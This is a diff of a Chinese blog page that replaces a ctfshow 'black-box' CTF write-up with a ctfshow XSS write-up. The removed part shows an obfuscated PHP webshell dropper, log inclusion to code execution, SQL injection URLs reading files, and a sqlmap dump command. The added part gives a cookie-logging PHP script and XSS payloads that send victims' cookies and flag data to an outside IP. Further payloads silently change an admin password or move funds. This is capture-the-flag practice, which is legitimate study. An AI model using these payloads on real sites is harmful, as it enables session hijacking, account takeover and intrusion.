@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-黑盒测试, Chenluo">
+    <meta name="keywords" content="ctfshow-xss, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-黑盒测试 | Chenluo</title>
+    <title>ctfshow-xss | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/24.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-黑盒测试</h1>
+                    <h1 class="description center-align post-title">ctfshow-xss</h1>
                 </div>
             </div>
         </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-29
+                    2021-08-06
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    675
+                    583
                 </div>
                 
 
@@ -490,191 +490,126 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><ul>
-<li><p>查看源码</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzym7g36j30nq0addi9.jpg" alt="image-20210730151523104"></p>
-</li>
-<li><p>各种尝试访问页面，去除根目录之后</p>
-</li>
+                <h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><ul>
+<li>在自己服务器下创建<code>cookie.php</code></li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzzpcm20j30q307sdh4.jpg" alt="image-20210730151625247"></p>
-<ul>
-<li>跑脚本，解码成二进制</li>
-</ul>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-
-url <span class="token operator">=</span> <span class="token string">"http://6a515a5e-f28a-46cd-9a7d-52e94fa89d5b.challenge.ctf.show:8080//layui/css/tree.css"</span>
-
-s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzogyww3j310c0ihwg4.jpg" alt="image-20210730150537910"></p>
-<ul>
-<li>访问<code>clear.php</code></li>
-<li>尝试一下安装目录</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzq9mkzej30kr038dgd.jpg" alt="image-20210730150721913"></p>
-<ul>
-<li>猜想利用<code>clear.php</code>,删除<code>lock.dat</code></li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzutsg6qj30uv05wgma.jpg" alt="image-20210730151143715"></p>
-<ul>
-<li>访问安装目录</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzvntzigj30jq0460tg.jpg" alt="image-20210730151223599"></p>
-<ul>
-<li>删除成功,重新安装</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyzwc5z78j30o4056my4.jpg" alt="image-20210730151311880"></p>
-<ul>
-<li>在后台页面<code>admin888</code>弱口令登陆</li>
-</ul>
-<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><ul>
-<li>robots.txt</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0pigogrj30m002m0t5.jpg" alt="image-20210730154114296"></p>
-<ul>
-<li>访问<code>/debug/</code></li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0q2k7n6j30l603k3yy.jpg" alt="image-20210730154146593"></p>
-<ul>
-<li>可能需要提供一个文件参数,尝试日志文件</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0r09d4bj30r809oae4.jpg" alt="image-20210730154239842"></p>
-<p><strong>成功包含了日志文件</strong></p>
-<ul>
-<li>尝试访问<code>/debug/</code>时向日志文件中写入一句话</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0ukpkrvj313607xjs6.jpg" alt="image-20210730154606307"></p>
-<ul>
-<li>再次访问日志文件，之后访问<code>2.txt</code></li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0vrtcyjj60lt0a9dgp02.jpg" alt="image-20210730154714845"></p>
-<ul>
-<li>可以写入，之后查找遍历各个文件寻找<code>flag</code></li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz0xh648sj313v0jqju1.jpg" alt="image-20210730154853563"></p>
-<ul>
-<li><code>flag</code>在``alsckdfy<code>的</code>check.php`中</li>
-</ul>
-<h2 id="Web388-editor"><a href="#Web388-editor" class="headerlink" title="Web388(editor)"></a>Web388(editor)</h2><ul>
-<li>根据源码，找到编辑器</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;alsckdfy&#x2F;editor&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz1ifdacuj30rj04ujsi.jpg" alt="image-20210730160901273"></p>
-<p>允许上传zip,html等文件,编写<code>1.txt</code>,改后缀名为1.zip</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?ph'</span><span class="token operator">.</span><span class="token string single-quoted-string">'p ev'</span><span class="token operator">.</span><span class="token string single-quoted-string">'al($_PO'</span><span class="token operator">.</span><span class="token string single-quoted-string">'ST[1]);?>'</span><span class="token punctuation">;</span>
-<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/1.php'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmp/flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no data input'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
-<li>上传文件，复制文件路径</li>
+<li>构建<code>xss</code>链接：</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz2okai3oj30ox06adgf.jpg" alt="image-20210730164928757"></p>
-<ul>
-<li>通过<code>/debug/?file=</code>参数传给日志文件</li>
-</ul>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">&#x2F;debug&#x2F;?file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;alsckdfy&#x2F;attached&#x2F;file&#x2F;20210730&#x2F;20210730084203_44752.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://xxxx/cookie.php?1='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
-<li>访问日志文件。执行一句话</li>
+<li>通过蚁剑，链接自己的服务器，或者直接查看网站目录下的tmp目录查看<code>flag.php</code>文件</li>
 </ul>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">&#x2F;debug&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>若是没有flag.php,注意设置tmp权限</strong></p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">chmod <span class="token number">777</span> tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>不需要显示</strong></p>
-<ul>
-<li>访问<code>1.php</code>,包含成功执行rce</li>
+<h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><ul>
+<li>构建xss链接</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz2sdu1vfj30qj0izmzz.jpg" alt="image-20210730165309290"></p>
-<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><ul>
-<li>访问<code>/debug/</code>,发现权限不足，找<code>session</code></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyNzYzNTg5MSwiZXhwIjoxNjI3NjQzMDkxLCJuYmYiOjE2Mjc2MzU4OTEsInN1YiI6InVzZXIiLCJqdGkiOiJmNTFiNWRhYzdhNzg3M2I5YjcwNGQwNzllN2FiNGM4YyJ9.PRTvpWgacNGn7HYET_WQ4iEEfZtwcTgVuPO-M07h1c4
-
-jwt
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz378rzvwj30ua0ge0vk.jpg" alt="image-20210730170727757"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz36pu6vtj30qt0eg75p.jpg" alt="image-20210730170657401"></p>
-<ul>
-<li><p>尝试上一题做法</p>
-</li>
-<li><p>编辑器写入文件后上传</p>
-</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz39ry5chj31240enq50.jpg" alt="image-20210730170954475"></p>
-<ul>
-<li>直接访问<code>2.php</code>,rce</li>
-</ul>
-<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><ul>
-<li>存在sql注入</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz3psoi8fj313z0bcmyg.jpg" alt="image-20210730172518181"></p>
-<ul>
-<li>尝试读取文件</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">
-http:&#x2F;&#x2F;de618e54-7015-4db3-981a-e23e603eba13.challenge.ctf.show:8080&#x2F;page.php?id&#x3D;1 union select 1,(select group_concat(username) from admin_user),(substr((select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;alsckdfy&#x2F;check.php&#39;)),1,255)) limit 1,1#
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token string">"window.location.href='http://xxxx/cookie.php?1='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
-<li>查看源代码</li>
+<li>刷新tmp目录，查看<code>flag.txt</code>文件</li>
 </ul>
-<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><ul>
-<li>出现新的搜索框，尝试sql注入</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz41ur3uej30a2052a9w.jpg" alt="image-20210730173653596"></p>
-<ul>
-<li>加载文件</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">
-http:&#x2F;&#x2F;f0b35f86-a675-4c66-8cf8-4e6a9302e2fa.challenge.ctf.show:8080&#x2F;search.php?title&#x3D;aa&#39; union select 1,substr((select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;alsckdfy&#x2F;check.php&#39;)),1,255),3 limit 0,1%23
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><ul>
-<li>同上，只不过flag换了位置</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;6802164f-1727-49a3-86a7-75fc1ba088bd.challenge.ctf.show:8080&#x2F;search.php?title&#x3D;aa&#39; union select 1,substr((select load_file(&#39;&#x2F;flag&#39;)),1,255),3 limit 0,1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><ul>
-<li>多了一个搜索引擎</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz4lhliu2j30qs03jq2t.jpg" alt="image-20210730175545537"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz4lx8v0fj30ln0d975b.jpg" alt="image-20210730175609956"></p>
-<ul>
-<li>这里猜想可能是根据id值，查询数据库得到对应的网址</li>
-<li>利用刚才的标题框，进行sqlmap爆破数据库</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz4npng8dj30k104maao.jpg" alt="image-20210730175752072"></p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://c6010f50-7daf-4e6a-951a-d17a16127c95.challenge.ctf.show:8080/search.php?title=1"</span> <span class="token comment">--dbms='mysql' --batch --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>​    <img src="https://tva1.sinaimg.cn/large/008i3skNly1gsz4ut8ypyj30fw0643zk.jpg" alt="image-20210730180442808"></p>
-<ul>
-<li>尝试修改<code>link</code>表中的<code>url</code>为<code>/flag</code></li>
-</ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?title<span class="token operator">=</span>aa<span class="token string">';update link set url='</span><span class="token keyword">file</span>:<span class="token comment">///flag';select 1,2,'a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web394"><a href="#web394" class="headerlink" title="web394"></a>web394</h2><ul>
-<li>向link表中插入值,并由16进制绕过</li>
-</ul>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">search<span class="token operator">.</span>php<span class="token operator">?</span>title<span class="token operator">=</span><span class="token number">1</span><span class="token string single-quoted-string">';insert into link values(10,'</span>a'<span class="token punctuation">,</span><span class="token number">0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<ul>
-<li>访问<code>link.php?id=10</code>,查看源代码</li>
-</ul>
-<h2 id="web395"><a href="#web395" class="headerlink" title="web395"></a>web395</h2><ul>
+<h2 id="web318-9"><a href="#web318-9" class="headerlink" title="web318-9"></a>web318-9</h2><ul>
 <li>同上</li>
 </ul>
+<h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><ul>
+<li>过滤空格</li>
+</ul>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">利用<span class="token comment">/**/</span>代替空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>构造xss链接</li>
+</ul>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span><span class="token string">"window.location.href='http://x.x.x.x/cookie.php?1='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Web321-326"><a href="#Web321-326" class="headerlink" title="Web321-326"></a>Web321-326</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>信的内容:</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span><span class="token string">"window.location.href='http://39.105.134.199/cookie.php?1='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><ul>
+<li>注册用户，密码设置为</li>
+</ul>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://39.105.134.199/cookie.php?1='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsy831hahkj30hh064wel.jpg" alt="image-20210729231052107"></p>
+<ul>
+<li>刷新<code>tmp</code>目录，拿到管理员<code>cookie</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsy86lt31tj30r001gdfp.jpg" alt="image-20210729231417682"></p>
+<ul>
+<li>利用<code>cookie</code>伪造管理员登陆，抓包查看内容</li>
+</ul>
+<p>异步数据传输，需要抓到<code>api</code>的包</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsy8a7ou2vj30zt073gnu.jpg" alt="image-20210729231744723"></p>
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><ul>
+<li>js遍历密码输出含有<code>ctfshow&#123;</code>的密码字符串</li>
+</ul>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerHTML<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctf'</span><span class="token operator">+</span><span class="token string">'show'</span><span class="token operator">+</span><span class="token string">'&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://39.105.134.199/cookie.php?1='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>刷新<code>tmp</code>目录</li>
+</ul>
+<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><ul>
+<li>l利用本地的方式修改admin用户的密码</li>
+</ul>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=123'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><p>在注册页面的用户名输入框输入上述命令</p>
+</li>
+<li><p>等待管理员点击，达到修改密码的目的，修改后的密码是123</p>
+</li>
+<li><p>利用密码登陆admin用户</p>
+</li>
+<li><p>抓包，查看用户管理</p>
+</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyabtoofoj30yf0a2go5.jpg" alt="image-20210730002829484"></p>
+<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><ul>
+<li>修改密码处改变了提交方式</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>用上述命令注册账户，密码随便，10秒后登陆<code>admin</code>(管理员)账号，密码123</li>
+</ul>
+<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><ul>
+<li>转账汇款处<code>-10000</code></li>
+<li>购买<code>flag</code></li>
+</ul>
+<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><ul>
+<li><p>方法一;<br>自己给自己转账,只要自己的转账金额不超过余额</p>
+</li>
+<li><p>方法二:</p>
+<ol>
+<li>先给admin转1元，抓包</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsyp5ozekej30av05yq3g.jpg" alt="D1A3C56C-5BA1-480B-9BB6-9490A998AC89"></p>
+<ol start="2">
+<li>创建用户，在admin登陆时自动输出用户名称，并完成转账</li>
+</ol>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
                 
             </div>
@@ -701,7 +636,7 @@ http:&#x2F;&#x2F;f0b35f86-a675-4c66-8cf8-4e6a9302e2fa.challenge.ctf.show:8080&#x
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/07/29/7734.html">http://echo-machile.github.io/2021/07/29/7734.html</a>
+                    <a href="http://echo-machile.github.io/2021/08/06/8066.html">http://echo-machile.github.io/2021/08/06/8066.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1198,13 +1133,13 @@ document.body.addEventListener('click', function(e) {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/07/29/7734.html">
+                <a href="/2021/08/06/8496.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="ctfshow-ssti注入">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="ctfshow-jwt">
                         
-                        <span class="card-title">ctfshow-ssti注入</span>
+                        <span class="card-title">ctfshow-jwt</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1215,7 +1150,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-06
                         </span>
                         <span class="publish-author">
                             
@@ -1243,13 +1178,13 @@ document.body.addEventListener('click', function(e) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/29/745.html">
+                <a href="/2021/07/29/7299.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Curl">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ctfshow-SSRF">
                         
-                        <span class="card-title">Curl</span>
+                        <span class="card-title">ctfshow-SSRF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
